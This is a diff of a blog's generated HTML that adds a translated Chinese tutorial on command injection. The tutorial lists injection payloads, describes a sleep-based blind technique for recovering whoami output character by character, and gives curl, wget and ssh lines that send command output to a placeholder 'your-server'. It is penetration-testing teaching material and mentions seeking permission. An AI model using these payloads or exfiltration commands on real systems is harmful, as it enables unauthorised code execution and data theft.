@@ -74,7 +74,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="OTEx911, security, web" />
+  <meta name="keywords" content="cmd-inject,pentest," />
 
 
 
@@ -90,15 +90,17 @@
 
 
 
-<meta name="description" content="水土不服的ctbf">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Ꭰ博客">
-<meta property="og:url" content="/tags/urls/index.html">
+<meta name="description" content="枕上听新蝉，偷得浮日闲    命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。">
+<meta name="keywords" content="cmd-inject,pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="（译）命令注入和原理">
+<meta property="og:url" content="/2017/06/22/cmd-inject/index.html">
 <meta property="og:site_name" content="Ꭰ博客">
-<meta property="og:description" content="水土不服的ctbf">
+<meta property="og:description" content="枕上听新蝉，偷得浮日闲    命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。">
+<meta property="og:updated_time" content="2017-06-21T16:55:27.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ꭰ博客">
-<meta name="twitter:description" content="水土不服的ctbf">
+<meta name="twitter:title" content="（译）命令注入和原理">
+<meta name="twitter:description" content="枕上听新蝉，偷得浮日闲    命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。">
 
 
 
@@ -126,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="/tags/urls/"/>
+  <link rel="canonical" href="/2017/06/22/cmd-inject/"/>
 
 
 
 
 
-  <title>标签: urls | Ꭰ博客</title>
+  <title>（译）命令注入和原理 | Ꭰ博客</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -167,7 +169,7 @@
     
   
 
-  <div class="container sidebar-position-left  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -271,44 +273,219 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-collapse">
-    <div class="collection-title">
-      <h1>urls<small>标签</small>
-      </h1>
-    </div>
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="/2017/06/22/cmd-inject/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="oTex911">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/header.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ꭰ博客">
+    </span>
 
     
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">（译）命令注入和原理</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T00:55:27+08:00">
+                2017-06-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index">
+                    <span itemprop="name">Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/06/22/cmd-inject/" class="leancloud_visitors" data-flag-title="（译）命令注入和原理">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
       
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+      
+        <blockquote class="blockquote-center"><p>枕上听新蝉，偷得浮日闲  </p>
+</blockquote>
+<p><em>命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。</em><a id="more"></a>假定系统响应时间通常是在500毫秒左右，当你尝试进行命令注入时，如果响应时间是5500毫秒（5秒的任意倍数，但至少得比没有进行命令注入时的响应时间要长）则表明命令注入成功。为了确保不是误报，请使用不同的时间参数进行sleep的调用(sleep 3 ，sleep 10等等)。如果RTT与你所输入的参数符合，很有可能你发现了一个注入漏洞。并不是所有的命令注入都是同样的利用方式，尝试下面不同的payloads：</p>
+<ul>
+<li>;sleep 5</li>
+<li>&amp;&amp; sleep 5 &amp;&amp; echo</li>
+<li>| sleep 5 &amp;&amp; echo</li>
+<li>‘&amp;&amp; sleep 5 &amp;&amp; echo</li>
+<li>“&amp;&amp; sleep 5 &amp;&amp; echo</li>
+<li>&amp;(sleep 5)</li>
+</ul>
+<p>接下来要搞清楚这个漏洞是普通的命令注入漏洞还是盲打的命令注入(以下简称盲注入)。这两种类型的区别在于盲注入在响应中不返回任何命令执行的结果。普通的命令注入会在响应中返回命令执行的结果。sleep命令通常是很好的观点证明。如果你需要更多的证明，可以执行<em>id</em>或<em>whoami</em>命令并将它们的执行结果作为证明。有一点重要的要记住：大多数公司不会喜欢你在他们系统上进行嗅探，所以在利用漏洞进一步获取信息前，先向公司申请许可。</p>
+<p>盲注命令的利用有些棘手，但在大多数场景中，仍可被利用。盲注命令的目的是控制sleep命令（或其他类似命令）的输出。使用盲注的技巧在于你将猜测的字符或数字作为参数传给sleep命令。让我们来分析<em>sleep $(whoami | cut -c 1 | tr a 5)</em>这个例子。</p>
+<ol>
+<li>首先是<em>whoami</em>命令的执行，假设返回的结果是<em>user</em>。</li>
+<li><em>shell</em>会捕获输出并将其传给命令<em>cut -c 1</em>。这条命令会截取<em>user</em>的第一个字符<em>u</em>。</li>
+<li><em>shell</em>捕获<em>cut</em>命令的输出，将其传给<em>tr a 5</em>，这条命令会将<em>cut</em>命令中输出的字符<em>a</em>替换成5（这个例子中<em>cut</em>输出的是字符<em>u</em>，所以不会替换成数字5）</li>
+<li><em>tr</em>命令的输出作为参数传给<em>sleep</em>命令，<em>sleep u</em>命令会被执行。因为<em>sleep</em>函数第一个参数只接受数字类型，所以<em>sleep u</em>命令会导致<em>shell</em>立即抛出错误。上述这些过程的目的是通过<em>tr</em>命令来迭代字符。一旦_sleep $(whoami | cut -c 1 | tr u 5)执行了，请求的RTT时间肯定超过5秒。</li>
+<li>猜中第一个字符后，通过修改<em>cut -c</em>的参数来重复上述操作猜测剩下的字符。</li>
+</ol>
+<p>如果服务器的延迟相当高，可以使用多个<em>tr</em>命令组合不同的延迟参数来加速迭代过程。比如_sleep $(whoami | cut -c 1 | tr a 5 | tr b 10 | tr c 15 | tr d 20 | tr e 25)。只要在服务器返回响应前没有超时，你可以一直重复这个操作。如果你确定输出的语言类型，可以以语言中高频字符为基础优化正在暴力破解的第一个字符。这里有一份英语的高频字符内容：<a href="https://en.m.wikipedia.org/wiki/Frequency_analysis" target="_blank" rel="external">高频分析</a>。</p>
+<p>另一种利用盲注命令的方式是将输出发送到你所控制的服务器上。这种方式并不是万能的，因为有些系统可能将对外连接进行了屏蔽。在这种情况下，你会被前面的例子困住。但你仍应该尝试一番。首先观察下列命令是否存在，如果存在的话这种困境将更好解决。</p>
+<ul>
+<li><em>curl -h &amp;&amp; sleep 5</em></li>
+<li><em>wget -h &amp;&amp; sleep 5</em></li>
+<li><em>ssh -V &amp;&amp; sleep 5</em></li>
+<li><em>telnet &amp;&amp; sleep 5</em></li>
+</ul>
+<p>如果上述命令将RTT时间拉长到5秒以上，则证明命令注入漏洞存在。接着，你可以使用任意命令发送命令执行结果到你自己的服务器上。就像下面这样：</p>
+<ul>
+<li><em>whoami | curl <a href="http://your-server" target="_blank" rel="external">http://your-server</a></em> -d @-(在post请求体里寻找输出)</li>
+<li><em>wget <a href="http://your-server/$(whoami" target="_blank" rel="external">http://your-server/$(whoami</a>)</em> (在请求的URI中寻找输出)</li>
+<li><em>export C=whoami | ssh user@your-server</em> (在你自己的服务器上创建一个不需要密码授权的<em>user</em>账号，同时记录所有执行了的命令)</li>
+</ul>
+<p>这是另外一件你可以尝试去做的事情：如果系统是web服务器，试着在外部能访问的文件上写入输出结果。举个例子，如果当前用户能够在<em>/var/www</em>下进行写的操作并且这也是web服务器文件的来源的话，那么可以通过<em>whoami &gt; /var/www/output</em>命令来达到目的。接着只要访问_<a href="http://the-server/output就能下载到输出结果。你也可以对服务器进行端口扫描来检测端口的情况。检查所有端口，看是否能够通过端口来下载命令执行的输出。" target="_blank" rel="external">http://the-server/output就能下载到输出结果。你也可以对服务器进行端口扫描来检测端口的情况。检查所有端口，看是否能够通过端口来下载命令执行的输出。</a></p>
+<p>愉快的黑客！</p>
+<p><a href="https://www.quora.com/What-is-command-injection-and-how-does-it-work/answer/Jobert-Abma?share=8502ef38&amp;srid=kl8Z" target="_blank" rel="external">原文</a></p>
 
-      <h2 class="post-title">
+      
+    </div>
+
+    <div>
+      
         
-            <a class="post-title-link" href="/2017/06/12/some-urls-worth-sharing/" itemprop="url">
-              
-                <span itemprop="name">一些值得分享的网站</span>
-              
-            </a>
+
+      
+    </div>
+
+    <div>
+      
         
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-06-12T23:17:29+08:00"
-              content="2017-06-12" >
-          06-12
-        </time>
-      </div>
+      
+    </div>
 
-    </header>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/cmd-inject/" rel="tag"># cmd-inject</a>
+          
+            <a href="/tags/pentest/" rel="tag"># pentest</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/17/how-to-ssrf/" rel="next" title="(译)如何伪造服务端请求-SSRF">
+                <i class="fa fa-chevron-left"></i> (译)如何伪造服务端请求-SSRF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </article>
 
 
-    
-  </div>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -316,6 +493,12 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODY0MC81MjEx"></div>
+    
+  </div>
+
 
         </div>
         
@@ -552,6 +735,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
 
   
 
@@ -586,6 +773,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
